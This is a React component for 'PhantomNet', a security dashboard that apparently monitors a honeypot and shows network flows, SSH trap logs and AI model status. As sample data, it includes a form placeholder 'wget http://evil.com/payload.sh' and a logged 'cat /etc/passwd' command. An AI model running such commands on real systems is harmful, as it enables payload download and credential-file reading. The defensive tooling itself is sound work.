import React, { useState, useEffect } from 'react';
import { io } from 'socket.io-client';

export default function App() {
  const [telemetry, setTelemetry] = useState({
    status: 'ONLINE',
    risk_score: 14,
    active_sessions: 27,
    high_severity: 1,
    network_flows: 1489,
    ai_models: 3,
    stream: 'Intercepted unauthorized shell probe on /auth/login...',
    sql_interceptions: 1,
    tarpit_delay: '0.8s',
    flows: [
      { source: '192.168.1.105', dest: '10.0.0.4 (Honey)', service: 'SSH', decision: 'TARPIT', severity: 'HIGH' },
      { source: '45.33.32.156', dest: '10.0.0.8 (SQL)', service: 'POSTGRES', decision: 'BLOCKED', severity: 'CRITICAL' },
      { source: '10.0.0.12', dest: '10.0.0.1 (Gateway)', service: 'HTTP', decision: 'ALLOW', severity: 'LOW' }
    ]
  });

  const [honeyLogs, setHoneyLogs] = useState([
    { source: '203.0.113.42', command: 'uname -a', timestamp: '21:40:12' },
    { source: '192.168.1.105', command: 'cat /etc/passwd', timestamp: '21:42:05' }
  ]);

  const [aiModelsState, setAiModelsState] = useState([
    { name: 'sql_model', role: 'Database Generation', status: 'READY', latency: '42ms' },
    { name: 'lore_model', role: 'Corporate Environment', status: 'READY', latency: '38ms' },
    { name: 'threat_evaluator', role: 'Payload Classification', status: 'STANDBY', latency: '65ms' }
  ]);

  const [inputCommand, setInputCommand] = useState('');
  const [inputSource, setInputSource] = useState('192.168.1.200');
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [filterSeverity, setFilterSeverity] = useState('ALL');
  const [activeTab, setActiveTab] = useState('Overview');

  useEffect(() => {
    const socket = io('http://localhost:5050');
    
    socket.on('telemetry_update', (data) => {
      setTelemetry(prev => ({ ...prev, ...data }));
    });

    socket.on('honey_log', (logEntry) => {
      setHoneyLogs(prev => [logEntry, ...prev]);
    });

    return () => socket.disconnect();
  }, []);

  const sendHoneyCommand = async (e) => {
    e.preventDefault();
    if (!inputCommand.trim()) return;
    
    await fetch('http://localhost:5050/api/honey/command', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ source: inputSource, command: inputCommand })
    });
    
    setInputCommand('');
  };

  const toggleModelStatus = (index) => {
    setAiModelsState(prev => prev.map((model, idx) => {
      if (idx === index) {
        const nextStatus = model.status === 'READY' ? 'STANDBY' : 'READY';
        return { ...model, status: nextStatus };
      }
      return model;
    }));
  };

  const COL_PLASMA_BLUE = '#00f2ff';
  const COL_NAVY_DEEP = '#0a1128';
  const COL_GLASS_BG = 'rgba(10, 17, 40, 0.85)';
  const FONT_MONO = "'Courier New', Courier, monospace";

  const cardStyle = {
    background: COL_GLASS_BG,
    backdropFilter: 'blur(16px)',
    border: `1px solid ${COL_PLASMA_BLUE}33`,
    borderRadius: '14px',
    padding: '1.25rem',
    boxShadow: '0 10px 30px -10px rgba(0,0,0,0.5)',
  };

  const filteredFlows = filterSeverity === 'ALL' 
    ? telemetry.flows 
    : telemetry.flows.filter(f => f.severity === filterSeverity);

  return (
    <div style={{ display: 'flex', minHeight: '100vh', backgroundColor: '#000000', color: '#f3f4f6', fontFamily: FONT_MONO }}>
      
      {/* Sidebar Navigation */}
      <aside style={{ width: '260px', background: COL_NAVY_DEEP, borderRight: `1px solid ${COL_PLASMA_BLUE}1a`, padding: '1.5rem', display: 'flex', flexDirection: 'column', gap: '2rem' }}>
        <div>
          <h2 style={{ fontSize: '1.2rem', fontWeight: 'bold', color: '#ffffff', margin: '0 0 0.2rem 0' }}>PHANTOMNET</h2>
          <span style={{ fontSize: '0.7rem', color: '#9ca3af', textTransform: 'uppercase', letterSpacing: '1px' }}>Plasma Ops</span>
        </div>
        
        <div style={{ padding: '0.6rem', background: `${COL_PLASMA_BLUE}1a`, border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '6px', fontSize: '0.75rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', display:'flex', alignItems:'center', gap:'8px' }}>
          <span style={{height:'8px', width:'8px', backgroundColor:COL_PLASMA_BLUE, borderRadius:'50%', display:'inline-block', boxShadow: `0 0 8px ${COL_PLASMA_BLUE}`}}></span>
          HONEYBOX ONLINE
        </div>

        <nav style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', fontSize: '0.85rem' }}>
          {['Overview', 'Sessions', 'Network Flows', 'Honey/SSH', 'SQLi Guard', 'AI Status'].map((item) => {
            const isActive = activeTab === item;
            return (
              <button
                key={item}
                onClick={() => setActiveTab(item)}
                style={{ 
                  textAlign: 'left',
                  padding: '0.6rem 0.75rem', 
                  borderRadius: '6px', 
                  background: isActive ? `${COL_PLASMA_BLUE}1a` : 'transparent',
                  color: isActive ? COL_PLASMA_BLUE : '#9ca3af', 
                  border: isActive ? `1px solid ${COL_PLASMA_BLUE}33` : '1px solid transparent',
                  cursor: 'pointer',
                  fontWeight: isActive ? 'bold' : 'normal',
                  fontFamily: FONT_MONO
                }}
              >
                {item}
              </button>
            );
          })}
        </nav>

        <div style={{ marginTop: 'auto', fontSize: '0.7rem', color: '#4b5563' }}>
          PHANTOMNET / WEEK 03
        </div>
      </aside>

      {/* Main Content */}
      <main style={{ flex: 1, padding: '2rem', display: 'flex', flexDirection: 'column', gap: '1.25rem', overflowY: 'auto' }}>
        
        <div>
          <div style={{ fontSize: '0.75rem', color: '#6b7280', textTransform: 'uppercase', marginBottom: '0.2rem' }}>Security / {activeTab}</div>
          <h1 style={{ fontSize: '1.75rem', fontWeight: 'bold', margin: 0, color: '#ffffff' }}>{activeTab}</h1>
        </div>

        {/* OVERVIEW TAB */}
        {activeTab === 'Overview' && (
          <>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '1rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>ACTIVE SESSIONS</div>
                <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.active_sessions}</div>
              </div>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>HIGH SEVERITY</div>
                <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#ef4444' }}>{telemetry.high_severity}</div>
              </div>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>NETWORK FLOWS</div>
                <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: COL_PLASMA_BLUE }}>{telemetry.network_flows}</div>
              </div>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.7rem', color: '#9ca3af', marginBottom: '0.4rem' }}>AI MODEL ACTIVITY</div>
                <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#fff' }}>{telemetry.ai_models}</div>
              </div>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.2rem' }}>{">_ LIVE EVENT TIMELINE"}</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Real-time security telemetry</span>
                <div style={{ padding: '1rem', background: 'rgba(0,0,0,0.4)', borderRadius: '8px', color: COL_PLASMA_BLUE, fontSize: '0.8rem', border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                  {telemetry.stream}
                </div>
              </div>

              <div style={{ ...cardStyle, display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>AI MODEL STATUS</div>
                {aiModelsState.slice(0, 2).map((m, i) => (
                  <div key={i} style={{ background: 'rgba(0,0,0,0.3)', padding: '0.75rem', borderRadius: '6px', border: `1px solid ${COL_PLASMA_BLUE}1a` }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem', fontWeight: 'bold' }}>
                      <span>{m.name}</span><span style={{ color: m.status === 'READY' ? '#34d399' : '#f59e0b' }}>{m.status}</span>
                    </div>
                    <div style={{ fontSize: '0.65rem', color: '#6b7280', marginTop: '0.2rem' }}>{m.role} • {m.latency}</div>
                  </div>
                ))}
              </div>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '0.8rem' }}>
                  <div>
                    <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>NETWORK FLOWS</div>
                    <span style={{ fontSize: '0.65rem', color: '#6b7280' }}>eBPF Flow Telemetry</span>
                  </div>
                  
                  <div style={{ display: 'flex', gap: '0.4rem' }}>
                    {['ALL', 'CRITICAL', 'HIGH', 'LOW'].map((lvl) => (
                      <button
                        key={lvl}
                        onClick={() => setFilterSeverity(lvl)}
                        style={{
                          background: filterSeverity === lvl ? `${COL_PLASMA_BLUE}22` : 'rgba(0,0,0,0.3)',
                          border: `1px solid ${filterSeverity === lvl ? COL_PLASMA_BLUE : 'rgba(255,255,255,0.1)'}`,
                          color: filterSeverity === lvl ? COL_PLASMA_BLUE : '#9ca3af',
                          padding: '0.2rem 0.5rem',
                          borderRadius: '4px',
                          fontSize: '0.65rem',
                          cursor: 'pointer',
                          fontWeight: 'bold'
                        }}
                      >
                        {lvl}
                      </button>
                    ))}
                  </div>
                </div>
                
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', fontSize: '0.7rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: '0.4rem', marginBottom: '0.5rem' }}>
                  <span>SOURCE</span>
                  <span>DESTINATION</span>
                  <span>SERVICE</span>
                  <span>DECISION</span>
                  <span>SEVERITY</span>
                </div>
                
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem', minHeight: '110px' }}>
                  {filteredFlows.length > 0 ? (
                    filteredFlows.map((flow, idx) => (
                      <div key={idx} onClick={() => setSelectedEvent(flow)} style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', fontSize: '0.7rem', padding: '0.4rem 0', cursor: 'pointer', borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                        <span style={{ color: '#9ca3af' }}>{flow.source}</span>
                        <span style={{ color: '#9ca3af' }}>{flow.dest}</span>
                        <span style={{ color: '#fff' }}>{flow.service}</span>
                        <span style={{ color: flow.decision === 'BLOCKED' ? '#ef4444' : '#34d399' }}>{flow.decision}</span>
                        <span style={{ color: flow.severity === 'CRITICAL' ? '#ef4444' : flow.severity === 'HIGH' ? '#f59e0b' : '#34d399' }}>{flow.severity}</span>
                      </div>
                    ))
                  ) : (
                    <div style={{ color: '#6b7280', fontSize: '0.7rem', textAlign: 'center', padding: '1.5rem' }}>No flows match severity filter [{filterSeverity}]</div>
                  )}
                </div>
              </div>

              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.2rem' }}>EVENT INSPECTOR</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Selected telemetry event</span>
                
                <div style={{ background: 'rgba(0,0,0,0.3)', padding: '1rem', borderRadius: '8px', fontSize: '0.75rem', color: '#9ca3af', minHeight: '100px', border: `1px solid ${COL_PLASMA_BLUE}1a` }}>
                  {selectedEvent ? (
                    <pre style={{ margin: 0, fontFamily: FONT_MONO, color: COL_PLASMA_BLUE }}>{JSON.stringify(selectedEvent, null, 2)}</pre>
                  ) : (
                    'Select an event from the network flows table.'
                  )}
                </div>
              </div>
            </div>
          </>
        )}

        {/* HONEY/SSH TAB */}
        {activeTab === 'Honey/SSH' && (
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.25rem' }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SSH HONEYPOT TRAP</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Simulated vulnerable SSH daemon</span>
                <div style={{ background: 'rgba(0,0,0,0.5)', padding: '1rem', borderRadius: '8px', fontSize: '0.75rem', color: '#34d399', fontFamily: FONT_MONO, border: `1px solid ${COL_PLASMA_BLUE}22` }}>
                  [+] Listening on port 2222 (Tarpit mode active)<br/>
                  [+] Captured credentials: root / password123<br/>
                  [+] Session isolation: SECURE_CONTAINER_V2
                </div>
              </div>

              <div style={cardStyle}>
                <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>SIMULATE ATTACKER COMMAND</div>
                <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Inject commands directly into honey stream</span>
                <form onSubmit={sendHoneyCommand} style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
                  <div>
                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.2rem' }}>Attacker IP Source</label>
                    <input 
                      type="text" 
                      value={inputSource} 
                      onChange={(e) => setInputSource(e.target.value)}
                      style={{ width: '100%', background: 'rgba(0,0,0,0.4)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '6px', padding: '0.5rem', color: '#fff', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                    />
                  </div>
                  <div>
                    <label style={{ fontSize: '0.65rem', color: '#9ca3af', display: 'block', marginBottom: '0.2rem' }}>Shell Command</label>
                    <input 
                      type="text" 
                      value={inputCommand} 
                      onChange={(e) => setInputCommand(e.target.value)}
                      placeholder="e.g. wget http://evil.com/payload.sh"
                      style={{ width: '100%', background: 'rgba(0,0,0,0.4)', border: `1px solid ${COL_PLASMA_BLUE}33`, borderRadius: '6px', padding: '0.5rem', color: '#34d399', fontSize: '0.75rem', fontFamily: FONT_MONO }}
                    />
                  </div>
                  <button 
                    type="submit"
                    style={{ background: `${COL_PLASMA_BLUE}22`, border: `1px solid ${COL_PLASMA_BLUE}`, color: COL_PLASMA_BLUE, padding: '0.5rem', borderRadius: '6px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                  >
                    Transmit Command Stream
                  </button>
                </form>
              </div>
            </div>
            
            <div style={cardStyle}>
              <div style={{ fontSize: '0.85rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.4rem' }}>LIVE COMMAND LOG STREAM</div>
              <span style={{ fontSize: '0.65rem', color: '#6b7280', display: 'block', marginBottom: '1rem' }}>Intercepted attacker terminal input</span>
              <div style={{ fontSize: '0.75rem', display: 'flex', flexDirection: 'column', gap: '0.5rem', maxHeight: '400px', overflowY: 'auto' }}>
                {honeyLogs.map((log, idx) => (
                  <div key={idx} style={{ background: 'rgba(0,0,0,0.4)', padding: '0.5rem 0.75rem', borderRadius: '6px', border: `1px solid ${COL_PLASMA_BLUE}22`, fontFamily: FONT_MONO }}>
                    <span style={{ color: '#6b7280', fontSize: '0.65rem' }}>[{log.timestamp}] </span>
                    <strong style={{ color: COL_PLASMA_BLUE }}>{log.source}</strong>: 
                    <span style={{ color: '#34d399', marginLeft: '0.4rem' }}>$ {log.command}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* AI STATUS TAB */}
        {activeTab === 'AI Status' && (
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '1.25rem' }}>
            {aiModelsState.map((model, idx) => (
              <div key={idx} style={{ ...cardStyle, display: 'flex', flexDirection: 'column', gap: '1rem' }}>
                <div>
                  <div style={{ fontSize: '0.9rem', color: COL_PLASMA_BLUE, fontWeight: 'bold' }}>{model.name}</div>
                  <span style={{ fontSize: '0.65rem', color: '#6b7280' }}>{model.role}</span>
                </div>
                
                <div style={{ background: 'rgba(0,0,0,0.4)', padding: '0.75rem', borderRadius: '6px', border: `1px solid ${COL_PLASMA_BLUE}22`, display: 'flex', justifyContent: 'space-between', fontSize: '0.75rem' }}>
                  <span>Status: <strong style={{ color: model.status === 'READY' ? '#34d399' : '#f59e0b' }}>{model.status}</strong></span>
                  <span style={{ color: '#9ca3af' }}>{model.latency}</span>
                </div>

                <button 
                  onClick={() => toggleModelStatus(idx)}
                  style={{ background: model.status === 'READY' ? 'rgba(239, 68, 68, 0.2)' : 'rgba(52, 211, 153, 0.2)', border: `1px solid ${model.status === 'READY' ? '#ef4444' : '#34d399'}`, color: model.status === 'READY' ? '#ef4444' : '#34d399', padding: '0.5rem', borderRadius: '6px', fontWeight: 'bold', fontSize: '0.75rem', cursor: 'pointer', fontFamily: FONT_MONO }}
                >
                  Toggle {model.status === 'READY' ? 'Standby' : 'Ready'}
                </button>
              </div>
            ))}
          </div>
        )}

        {/* OTHER TABS */}
        {activeTab !== 'Overview' && activeTab !== 'Honey/SSH' && activeTab !== 'AI Status' && (
          <div style={cardStyle}>
            <div style={{ fontSize: '1rem', color: COL_PLASMA_BLUE, fontWeight: 'bold', marginBottom: '0.5rem' }}>{activeTab} Module View</div>
            <p style={{ fontSize: '0.8rem', color: '#9ca3af', margin: 0 }}>
              Dedicated telemetry and management interface for {activeTab} is active and listening on WebSocket stream.
            </p>
          </div>
        )}

      </main>
    </div>
  );
}
